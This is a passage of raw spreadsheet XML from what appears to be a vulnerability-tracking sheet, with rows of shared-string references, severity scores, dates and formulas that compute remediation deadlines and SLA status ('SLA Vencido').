      </c>
    </row>
    <row r="183" spans="1:34" ht="72.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A183" s="5">
        <v>182</v>
      </c>
      <c r="B183" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C183" s="5" t="s">
        <v>630</v>
      </c>
      <c r="D183" s="5"/>
      <c r="E183" s="4"/>
      <c r="F183" s="4"/>
      <c r="G183" s="6" t="s">
        <v>138</v>
      </c>
      <c r="H183" s="4"/>
      <c r="I183" s="4"/>
      <c r="J183" s="4" t="s">
        <v>671</v>
      </c>
      <c r="K183" s="6"/>
      <c r="L183" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M183" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N183" s="5"/>
      <c r="O183" s="14" t="s">
        <v>672</v>
      </c>
      <c r="P183" s="6" t="s">
        <v>673</v>
      </c>
      <c r="Q183" s="4" t="s">
        <v>143</v>
      </c>
      <c r="R183" s="4">
        <v>443</v>
      </c>
      <c r="S183" s="22"/>
      <c r="T183" s="8">
        <v>44559</v>
      </c>
      <c r="U183" s="11">
        <f t="shared" ca="1" si="6"/>
        <v>1650</v>
      </c>
      <c r="V183" s="8">
        <f t="shared" si="7"/>
        <v>44649</v>
      </c>
      <c r="W183" s="12" t="str">
        <f t="shared" ca="1" si="8"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X183" s="12"/>
      <c r="Y183" s="11"/>
      <c r="Z183" s="11"/>
      <c r="AA183" s="8">
        <v>44592</v>
      </c>
      <c r="AB183" s="32" t="s">
        <v>674</v>
      </c>
      <c r="AC183" s="32" t="s">
        <v>675</v>
      </c>
      <c r="AD183" s="9" t="s">
        <v>676</v>
      </c>
      <c r="AE183" s="8" t="s">
        <v>147</v>
      </c>
      <c r="AF183" s="27" t="s">
        <v>497</v>
      </c>
      <c r="AG183" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH183" t="str">
        <f>IFERROR(VLOOKUP(H183,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="184" spans="1:34" ht="116" hidden="1" x14ac:dyDescent="0.35">
      <c r="A184" s="5">
        <v>183</v>
      </c>
      <c r="B184" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C184" s="5" t="s">
        <v>630</v>
      </c>
      <c r="D184" s="5"/>
      <c r="E184" s="4"/>
      <c r="F184" s="4"/>
      <c r="G184" s="6" t="s">
        <v>138</v>
      </c>
      <c r="H184" s="4"/>
      <c r="I184" s="4"/>
      <c r="J184" s="4" t="s">
        <v>677</v>
      </c>
      <c r="K184" s="6"/>
      <c r="L184" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M184" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N184" s="5"/>
      <c r="O184" s="14" t="s">
        <v>678</v>
      </c>
      <c r="P184" s="6" t="s">
        <v>673</v>
      </c>
      <c r="Q184" s="4" t="s">
        <v>143</v>
      </c>
      <c r="R184" s="4">
        <v>443</v>
      </c>
      <c r="S184" s="22"/>
      <c r="T184" s="8">
        <v>44559</v>
      </c>
      <c r="U184" s="11">
        <f t="shared" ca="1" si="6"/>
        <v>1650</v>
      </c>
      <c r="V184" s="8">
        <f t="shared" si="7"/>
        <v>44649</v>
      </c>
      <c r="W184" s="12" t="str">
        <f t="shared" ca="1" si="8"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X184" s="12"/>
      <c r="Y184" s="11"/>
      <c r="Z184" s="11"/>
      <c r="AA184" s="8">
        <v>44592</v>
      </c>
      <c r="AB184" s="32" t="s">
        <v>679</v>
      </c>
      <c r="AC184" s="32" t="s">
        <v>680</v>
      </c>
      <c r="AD184" s="9" t="s">
        <v>681</v>
      </c>
      <c r="AE184" s="8" t="s">
        <v>147</v>
      </c>
      <c r="AF184" s="27" t="s">
        <v>497</v>
      </c>
      <c r="AG184" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH184" t="str">
        <f>IFERROR(VLOOKUP(H184,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="185" spans="1:34" ht="29" hidden="1" x14ac:dyDescent="0.35">
      <c r="A185" s="5">
        <v>184</v>
      </c>
      <c r="B185" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C185" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D185" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E185" s="4"/>
      <c r="F185" s="4"/>
      <c r="G185" s="6" t="s">
        <v>445</v>
      </c>
      <c r="H185" s="4" t="s">
        <v>682</v>
      </c>
      <c r="I185" s="4"/>
      <c r="J185" s="4" t="s">
        <v>459</v>
      </c>
      <c r="K185" s="6"/>
      <c r="L185" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M185" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N185" s="5"/>
      <c r="O185" s="14"/>
      <c r="P185" s="6"/>
      <c r="Q185" s="6" t="s">
        <v>447</v>
      </c>
      <c r="R185" s="4"/>
      <c r="S185" s="22"/>
      <c r="T185" s="8">
        <v>44573</v>
      </c>
      <c r="U185" s="11">
        <f t="shared" ca="1" si="6"/>
        <v>1636</v>
      </c>
      <c r="V185" s="8">
        <f t="shared" si="7"/>
        <v>44663</v>
      </c>
      <c r="W185" s="12" t="str">
        <f t="shared" ca="1" si="8"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X185" s="12"/>
      <c r="Y185" s="11"/>
      <c r="Z185" s="11"/>
      <c r="AA185" s="8">
        <v>45271</v>
      </c>
      <c r="AB185" s="32" t="s">
        <v>683</v>
      </c>
      <c r="AC185" s="32" t="s">
        <v>572</v>
      </c>
      <c r="AD185" s="9"/>
      <c r="AE185" s="8">
        <v>45199</v>
      </c>
      <c r="AF185" s="27" t="s">
        <v>684</v>
      </c>
      <c r="AG185" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH185" t="str">
        <f>IFERROR(VLOOKUP(H185,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="186" spans="1:34" ht="188.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A186" s="5">
        <v>185</v>
      </c>
      <c r="B186" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C186" s="5" t="s">
        <v>630</v>
      </c>
      <c r="D186" s="5"/>
      <c r="E186" s="4"/>
      <c r="F186" s="4"/>
      <c r="G186" s="6" t="s">
        <v>138</v>
      </c>
      <c r="H186" s="4"/>
      <c r="I186" s="4"/>
      <c r="J186" s="4" t="s">
        <v>685</v>
      </c>
      <c r="K186" s="6"/>
      <c r="L186" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M186" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N186" s="5"/>
      <c r="O186" s="14"/>
      <c r="P186" s="6" t="s">
        <v>673</v>
      </c>
      <c r="Q186" s="4" t="s">
        <v>143</v>
      </c>
      <c r="R186" s="4"/>
      <c r="S186" s="22"/>
      <c r="T186" s="8">
        <v>44579</v>
      </c>
      <c r="U186" s="11">
        <f t="shared" ca="1" si="6"/>
        <v>1630</v>
      </c>
      <c r="V186" s="8">
        <f t="shared" si="7"/>
        <v>44669</v>
      </c>
      <c r="W186" s="12" t="str">
        <f t="shared" ca="1" si="8"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X186" s="12"/>
      <c r="Y186" s="11"/>
      <c r="Z186" s="11"/>
      <c r="AA186" s="8">
        <v>44592</v>
      </c>
      <c r="AB186" s="32" t="s">
        <v>686</v>
      </c>
      <c r="AC186" s="32" t="s">
        <v>687</v>
      </c>
      <c r="AD186" s="9" t="s">
        <v>688</v>
      </c>
      <c r="AE186" s="8" t="s">
        <v>147</v>
      </c>
      <c r="AF186" s="27" t="s">
        <v>497</v>
      </c>
      <c r="AG186" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH186" t="str">
        <f>IFERROR(VLOOKUP(H186,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="187" spans="1:34" ht="159.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A187" s="5">
        <v>186</v>
      </c>
      <c r="B187" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C187" s="5" t="s">
        <v>630</v>
      </c>
      <c r="D187" s="5"/>
      <c r="E187" s="4"/>
      <c r="F187" s="4"/>
      <c r="G187" s="6" t="s">
        <v>138</v>
      </c>
      <c r="H187" s="4"/>
      <c r="I187" s="4"/>
      <c r="J187" s="4" t="s">
        <v>689</v>
      </c>
      <c r="K187" s="6"/>
      <c r="L187" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M187" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N187" s="5"/>
      <c r="O187" s="14"/>
      <c r="P187" s="6" t="s">
        <v>673</v>
      </c>
      <c r="Q187" s="4" t="s">
        <v>143</v>
      </c>
      <c r="R187" s="4"/>
      <c r="S187" s="22"/>
      <c r="T187" s="8">
        <v>44579</v>
      </c>
      <c r="U187" s="11">
        <f t="shared" ca="1" si="6"/>
        <v>1630</v>
      </c>
      <c r="V187" s="8">
        <f t="shared" si="7"/>
        <v>44699</v>
      </c>
      <c r="W187" s="12" t="str">
        <f t="shared" ca="1" si="8"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X187" s="12"/>
      <c r="Y187" s="11"/>
      <c r="Z187" s="11"/>
      <c r="AA187" s="8">
        <v>44592</v>
      </c>
      <c r="AB187" s="32" t="s">
        <v>690</v>
      </c>
      <c r="AC187" s="32" t="s">
        <v>687</v>
      </c>
      <c r="AD187" s="9" t="s">
        <v>691</v>
      </c>
      <c r="AE187" s="8" t="s">
        <v>147</v>
      </c>
      <c r="AF187" s="27" t="s">
        <v>497</v>
      </c>
      <c r="AG187" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH187" t="str">
        <f>IFERROR(VLOOKUP(H187,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="188" spans="1:34" ht="145" hidden="1" x14ac:dyDescent="0.35">
      <c r="A188" s="5">
        <v>187</v>
      </c>
      <c r="B188" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C188" s="5" t="s">
        <v>630</v>
      </c>
      <c r="D188" s="5"/>
      <c r="E188" s="4"/>
      <c r="F188" s="4"/>
      <c r="G188" s="6" t="s">
        <v>138</v>
      </c>
      <c r="H188" s="4"/>
      <c r="I188" s="4"/>
      <c r="J188" s="4" t="s">
        <v>692</v>
      </c>
      <c r="K188" s="6"/>
      <c r="L188" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M188" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N188" s="5"/>
      <c r="O188" s="14"/>
      <c r="P188" s="6" t="s">
        <v>673</v>
      </c>
      <c r="Q188" s="4" t="s">
        <v>143</v>
      </c>
      <c r="R188" s="4"/>
      <c r="S188" s="22"/>
      <c r="T188" s="8">
        <v>44579</v>
      </c>
      <c r="U188" s="11">
        <f t="shared" ca="1" si="6"/>
        <v>1630</v>
      </c>
      <c r="V188" s="8">
        <f t="shared" si="7"/>
        <v>44699</v>
      </c>
      <c r="W188" s="12" t="str">
        <f t="shared" ca="1" si="8"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X188" s="12"/>
      <c r="Y188" s="11"/>
      <c r="Z188" s="11"/>
      <c r="AA188" s="8">
        <v>44592</v>
      </c>
      <c r="AB188" s="32" t="s">
        <v>693</v>
      </c>
      <c r="AC188" s="32" t="s">
        <v>687</v>
      </c>
      <c r="AD188" s="9" t="s">
        <v>694</v>
      </c>
      <c r="AE188" s="8" t="s">
        <v>147</v>
      </c>
      <c r="AF188" s="27" t="s">
        <v>497</v>
      </c>
      <c r="AG188" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH188" t="str">
        <f>IFERROR(VLOOKUP(H188,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="189" spans="1:34" ht="116" hidden="1" x14ac:dyDescent="0.35">
      <c r="A189" s="5">
        <v>188</v>
      </c>
      <c r="B189" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C189" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D189" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E189" s="4"/>
      <c r="F189" s="4"/>
      <c r="G189" s="6" t="s">
        <v>138</v>
      </c>
      <c r="H189" s="4" t="s">
        <v>695</v>
      </c>
      <c r="I189" s="4" t="s">
        <v>696</v>
      </c>
      <c r="J189" s="4" t="s">
        <v>491</v>
      </c>
      <c r="K189" s="6"/>
      <c r="L189" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M189" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N189" s="5">
        <v>5.3</v>
      </c>
      <c r="O189" s="14"/>
      <c r="P189" s="10" t="s">
        <v>142</v>
      </c>
      <c r="Q189" s="4" t="s">
        <v>143</v>
      </c>
      <c r="R189" s="4">
        <v>443</v>
      </c>
      <c r="S189" s="22" t="s">
        <v>697</v>
      </c>
      <c r="T189" s="8">
        <v>44776</v>
      </c>
      <c r="U189" s="11">
        <f t="shared" ca="1" si="6"/>
        <v>1433</v>
      </c>
      <c r="V189" s="8">
        <f t="shared" si="7"/>
        <v>44866</v>
      </c>
      <c r="W189" s="12" t="str">
        <f t="shared" ca="1" si="8"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X189" s="12"/>
      <c r="Y189" s="11"/>
      <c r="Z189" s="11"/>
      <c r="AA189" s="8">
        <v>45012</v>
      </c>
      <c r="AB189" s="32" t="s">
        <v>698</v>
      </c>
      <c r="AC189" s="32" t="s">
        <v>699</v>
      </c>
      <c r="AD189" s="9" t="s">
        <v>700</v>
      </c>
      <c r="AE189" s="8">
        <v>44895</v>
      </c>
      <c r="AF189" s="27"/>
      <c r="AG189" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH189" t="str">
        <f>IFERROR(VLOOKUP(H189,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="190" spans="1:34" ht="116" hidden="1" x14ac:dyDescent="0.35">
      <c r="A190" s="5">
        <v>189</v>
      </c>
      <c r="B190" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C190" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D190" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E190" s="4"/>
      <c r="F190" s="4"/>
      <c r="G190" s="6" t="s">
        <v>138</v>
      </c>
      <c r="H190" s="4" t="s">
        <v>701</v>
      </c>
      <c r="I190" s="4" t="s">
        <v>702</v>
      </c>
      <c r="J190" s="4" t="s">
        <v>703</v>
      </c>
      <c r="K190" s="6"/>
      <c r="L190" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M190" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N190" s="5">
        <v>4.7</v>
      </c>
      <c r="O190" s="14"/>
      <c r="P190" s="10" t="s">
        <v>142</v>
      </c>
      <c r="Q190" s="4" t="s">
        <v>143</v>
      </c>
      <c r="R190" s="4">
        <v>443</v>
      </c>
      <c r="S190" s="22" t="s">
        <v>697</v>
      </c>
      <c r="T190" s="8">
        <v>44776</v>
      </c>
      <c r="U190" s="11">
        <f t="shared" ca="1" si="6"/>
        <v>1433</v>
      </c>
      <c r="V190" s="8">
        <f t="shared" si="7"/>
        <v>44866</v>
      </c>
      <c r="W190" s="12" t="str">
        <f t="shared" ca="1" si="8"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X190" s="12"/>
      <c r="Y190" s="11"/>
      <c r="Z190" s="11"/>
      <c r="AA190" s="8">
        <v>44944</v>
      </c>
      <c r="AB190" s="32" t="s">
        <v>704</v>
      </c>
      <c r="AC190" s="32" t="s">
        <v>705</v>
      </c>
      <c r="AD190" s="9" t="s">
        <v>706</v>
      </c>
      <c r="AE190" s="8">
        <v>44895</v>
      </c>
      <c r="AF190" s="27" t="s">
        <v>707</v>
      </c>
      <c r="AG190" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH190" t="str">
        <f>IFERROR(VLOOKUP(H190,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="191" spans="1:34" ht="188.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A191" s="5">
        <v>190</v>
      </c>
      <c r="B191" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C191" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D191" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E191" s="4"/>
      <c r="F191" s="4"/>
      <c r="G191" s="6" t="s">
        <v>138</v>
      </c>
      <c r="H191" s="4" t="s">
        <v>708</v>
      </c>
      <c r="I191" s="4" t="s">
        <v>709</v>
      </c>
      <c r="J191" s="4" t="s">
        <v>710</v>
      </c>
      <c r="K191" s="6"/>
      <c r="L191" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M191" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N191" s="5">
        <v>3.7</v>
      </c>
      <c r="O191" s="14"/>
      <c r="P191" s="10" t="s">
        <v>382</v>
      </c>
      <c r="Q191" s="4" t="s">
        <v>143</v>
      </c>
      <c r="R191" s="4"/>
      <c r="S191" s="22"/>
      <c r="T191" s="8">
        <v>44776</v>
      </c>
      <c r="U191" s="11">
        <f t="shared" ca="1" si="6"/>
        <v>1433</v>
      </c>
      <c r="V191" s="8">
        <f t="shared" si="7"/>
        <v>44896</v>
      </c>
      <c r="W191" s="12" t="str">
        <f t="shared" ca="1" si="8"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X191" s="12"/>
      <c r="Y191" s="11"/>
      <c r="Z191" s="11"/>
      <c r="AA191" s="8">
        <v>44944</v>
      </c>
      <c r="AB191" s="32" t="s">
        <v>711</v>
      </c>
      <c r="AC191" s="32" t="s">
        <v>712</v>
      </c>
      <c r="AD191" s="9" t="s">
        <v>713</v>
      </c>
      <c r="AE191" s="8">
        <v>44895</v>
      </c>
      <c r="AF191" s="27" t="s">
        <v>148</v>
      </c>
      <c r="AG191" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH191" t="str">
        <f>IFERROR(VLOOKUP(H191,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="192" spans="1:34" ht="87" hidden="1" x14ac:dyDescent="0.35">
      <c r="A192" s="5">
        <v>191</v>
      </c>
      <c r="B192" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C192" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D192" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E192" s="4"/>
      <c r="F192" s="4"/>
      <c r="G192" s="6" t="s">
        <v>138</v>
      </c>
      <c r="H192" s="4" t="s">
        <v>714</v>
      </c>
      <c r="I192" s="4" t="s">
        <v>715</v>
      </c>
      <c r="J192" s="4" t="s">
        <v>716</v>
      </c>
      <c r="K192" s="6"/>
      <c r="L192" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M192" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N192" s="5">
        <v>3.7</v>
      </c>
      <c r="O192" s="14"/>
      <c r="P192" s="10" t="s">
        <v>382</v>
      </c>
      <c r="Q192" s="4" t="s">
        <v>143</v>
      </c>
      <c r="R192" s="4"/>
      <c r="S192" s="22"/>
      <c r="T192" s="8">
        <v>44776</v>
      </c>
      <c r="U192" s="11">
        <f t="shared" ca="1" si="6"/>
        <v>1433</v>
      </c>
      <c r="V192" s="8">
        <f t="shared" si="7"/>
        <v>44896</v>
      </c>
      <c r="W192" s="12" t="str">
        <f t="shared" ca="1" si="8"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X192" s="12"/>
      <c r="Y192" s="11"/>
      <c r="Z192" s="11"/>
      <c r="AA192" s="8">
        <v>45012</v>
      </c>
      <c r="AB192" s="32" t="s">
        <v>717</v>
      </c>
      <c r="AC192" s="32" t="s">
        <v>718</v>
      </c>
      <c r="AD192" s="9" t="s">
        <v>719</v>
      </c>
      <c r="AE192" s="8">
        <v>44895</v>
      </c>
      <c r="AF192" s="27"/>
      <c r="AG192" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH192" t="str">
        <f>IFERROR(VLOOKUP(H192,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="193" spans="1:34" ht="174" hidden="1" x14ac:dyDescent="0.35">
      <c r="A193" s="5">
        <v>192</v>
      </c>
      <c r="B193" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C193" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D193" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E193" s="4"/>
      <c r="F193" s="4"/>
      <c r="G193" s="6" t="s">
        <v>138</v>
      </c>
      <c r="H193" s="9" t="s">
        <v>720</v>
      </c>
      <c r="I193" s="4" t="s">
        <v>721</v>
      </c>
      <c r="J193" s="4" t="s">
        <v>722</v>
      </c>
      <c r="K193" s="6"/>
      <c r="L193" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M193" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N193" s="5">
        <v>3.7</v>
      </c>
      <c r="O193" s="14"/>
      <c r="P193" s="10" t="s">
        <v>382</v>
      </c>
      <c r="Q193" s="4" t="s">
        <v>143</v>
      </c>
      <c r="R193" s="4"/>
      <c r="S193" s="22"/>
      <c r="T193" s="8">
        <v>44776</v>
      </c>
      <c r="U193" s="11">
        <f t="shared" ca="1" si="6"/>
        <v>1433</v>
      </c>
      <c r="V193" s="8">
        <f t="shared" si="7"/>
        <v>44896</v>
      </c>
      <c r="W193" s="12" t="str">
        <f t="shared" ca="1" si="8"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X193" s="12"/>
      <c r="Y193" s="11"/>
      <c r="Z193" s="11"/>
      <c r="AA193" s="8">
        <v>45012</v>
      </c>
      <c r="AB193" s="32" t="s">
        <v>723</v>
      </c>
      <c r="AC193" s="32" t="s">
        <v>724</v>
      </c>
      <c r="AD193" s="9" t="s">
        <v>725</v>
      </c>
      <c r="AE193" s="8">
        <v>44895</v>
      </c>
      <c r="AF193" s="27"/>
      <c r="AG193" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH193" t="str">
        <f>IFERROR(VLOOKUP(H193,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="194" spans="1:34" ht="114.75" hidden="1" customHeight="1" x14ac:dyDescent="0.35">
      <c r="A194" s="5">
        <v>193</v>
      </c>
      <c r="B194" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C194" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D194" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E194" s="4"/>
      <c r="F194" s="4"/>
      <c r="G194" s="6" t="s">
        <v>445</v>
      </c>
      <c r="H194" s="4" t="s">
        <v>726</v>
      </c>
      <c r="I194" s="4" t="s">
        <v>727</v>
      </c>
      <c r="J194" s="4" t="s">
        <v>728</v>
      </c>
      <c r="K194" s="6"/>
      <c r="L194" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M194" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N194" s="5">
        <v>6.1</v>
      </c>
      <c r="O194" s="14" t="s">
        <v>729</v>
      </c>
      <c r="P194" s="10"/>
      <c r="Q194" s="6" t="s">
        <v>447</v>
      </c>
      <c r="R194" s="4"/>
      <c r="S194" s="22"/>
      <c r="T194" s="8">
        <v>44776</v>
      </c>
      <c r="U194" s="11">
        <f t="shared" ref="U194:U257" ca="1" si="9">TODAY()-T194</f>
        <v>1433</v>
      </c>
      <c r="V194" s="8">
        <f t="shared" ref="V194:V257" si="10">IF(M194="Critical",T194+10,IF(M194="High",T194+30,IF(M194="Bad",T194+30,IF(M194="Medium",T194+90,IF(M194="Warm",T194+90,IF(M194="Low",T194+120,IF(M194="Fair",T194+120,IF(M194="Neutral",T194+120,""))))))))</f>
        <v>44866</v>
      </c>
      <c r="W194" s="12" t="str">
        <f t="shared" ref="W194:W257" ca="1" si="11">IF(M194="Critical",IF(U194&gt;10,"SLA Vencido","En SLA"),IF(M194="High",IF(U194&gt;30,"SLA Vencido","En SLA"),IF(M194="Bad",IF(U194&gt;30,"SLA Vencido","En SLA"),IF(M194="Medium",IF(U194&gt;90,"SLA Vencido","En SLA"),IF(M194="Warm",IF(U194&gt;90,"SLA Vencido","En SLA"),IF(M194="Low",IF(U194&gt;120,"SLA Vencido","En SLA"),IF(M194="Fair",IF(U194&gt;120,"SLA Vencido","En SLA"),IF(M194="Neutral",IF(U194&gt;120,"SLA Vencido","En SLA"),"Error"))))))))</f>
        <v>SLA Vencido</v>
      </c>
      <c r="X194" s="12"/>
      <c r="Y194" s="11"/>
      <c r="Z194" s="11"/>
      <c r="AA194" s="8">
        <v>45503</v>
      </c>
      <c r="AB194" s="32" t="s">
        <v>730</v>
      </c>
      <c r="AC194" s="32" t="s">
        <v>731</v>
      </c>
      <c r="AD194" s="9" t="s">
        <v>732</v>
      </c>
      <c r="AE194" s="8">
        <v>45199</v>
      </c>
      <c r="AF194" s="27" t="s">
        <v>733</v>
      </c>
      <c r="AG194" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH194" t="str">
        <f>IFERROR(VLOOKUP(H194,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="195" spans="1:34" ht="174" hidden="1" x14ac:dyDescent="0.35">
      <c r="A195" s="5">
        <v>194</v>
      </c>
      <c r="B195" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C195" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D195" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E195" s="4"/>
      <c r="F195" s="4"/>
      <c r="G195" s="6" t="s">
        <v>445</v>
      </c>
      <c r="H195" s="4" t="s">
        <v>734</v>
      </c>
      <c r="I195" s="4" t="s">
        <v>735</v>
      </c>
      <c r="J195" s="4" t="s">
        <v>421</v>
      </c>
      <c r="K195" s="6"/>
      <c r="L195" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M195" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N195" s="5">
        <v>5.3</v>
      </c>
      <c r="O195" s="14"/>
      <c r="P195" s="10" t="s">
        <v>175</v>
      </c>
      <c r="Q195" s="6" t="s">
        <v>447</v>
      </c>
      <c r="R195" s="4"/>
      <c r="S195" s="22"/>
      <c r="T195" s="8">
        <v>44776</v>
      </c>
      <c r="U195" s="11">
        <f t="shared" ca="1" si="9"/>
        <v>1433</v>
      </c>
      <c r="V195" s="8">
        <f t="shared" si="10"/>
        <v>44866</v>
      </c>
      <c r="W195" s="12" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X195" s="12"/>
      <c r="Y195" s="11"/>
      <c r="Z195" s="11"/>
      <c r="AA195" s="8">
        <v>45503</v>
      </c>
      <c r="AB195" s="32" t="s">
        <v>736</v>
      </c>
      <c r="AC195" s="32" t="s">
        <v>737</v>
      </c>
      <c r="AD195" s="9" t="s">
        <v>738</v>
      </c>
      <c r="AE195" s="8" t="s">
        <v>147</v>
      </c>
      <c r="AF195" s="27" t="s">
        <v>733</v>
      </c>
      <c r="AG195" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH195" t="str">
        <f>IFERROR(VLOOKUP(H195,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="196" spans="1:34" ht="101.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A196" s="5">
        <v>195</v>
      </c>
      <c r="B196" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C196" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D196" s="5" t="s">
        <v>371</v>
      </c>
      <c r="E196" s="4"/>
      <c r="F196" s="4"/>
      <c r="G196" s="6" t="s">
        <v>739</v>
      </c>
      <c r="H196" s="4" t="s">
        <v>740</v>
      </c>
      <c r="I196" s="4" t="s">
        <v>741</v>
      </c>
      <c r="J196" s="4" t="s">
        <v>742</v>
      </c>
      <c r="K196" s="6"/>
      <c r="L196" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M196" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N196" s="5">
        <v>3.7</v>
      </c>
      <c r="O196" s="14"/>
      <c r="P196" s="10"/>
      <c r="Q196" s="6" t="s">
        <v>743</v>
      </c>
      <c r="R196" s="4">
        <v>443</v>
      </c>
      <c r="S196" s="22"/>
      <c r="T196" s="8">
        <v>44826</v>
      </c>
      <c r="U196" s="11">
        <f t="shared" ca="1" si="9"/>
        <v>1383</v>
      </c>
      <c r="V196" s="8">
        <f t="shared" si="10"/>
        <v>44946</v>
      </c>
      <c r="W196" s="12" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X196" s="12"/>
      <c r="Y196" s="11"/>
      <c r="Z196" s="11"/>
      <c r="AA196" s="8">
        <v>44916</v>
      </c>
      <c r="AB196" s="32" t="s">
        <v>744</v>
      </c>
      <c r="AC196" s="32" t="s">
        <v>745</v>
      </c>
      <c r="AD196" s="9" t="s">
        <v>746</v>
      </c>
      <c r="AE196" s="8">
        <v>44900</v>
      </c>
      <c r="AF196" s="27" t="s">
        <v>148</v>
      </c>
      <c r="AG196" s="27" t="s">
        <v>747</v>
      </c>
      <c r="AH196" t="str">
        <f>IFERROR(VLOOKUP(H196,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="197" spans="1:34" ht="145" hidden="1" x14ac:dyDescent="0.35">
      <c r="A197" s="5">
        <v>196</v>
      </c>
      <c r="B197" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C197" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D197" s="5" t="s">
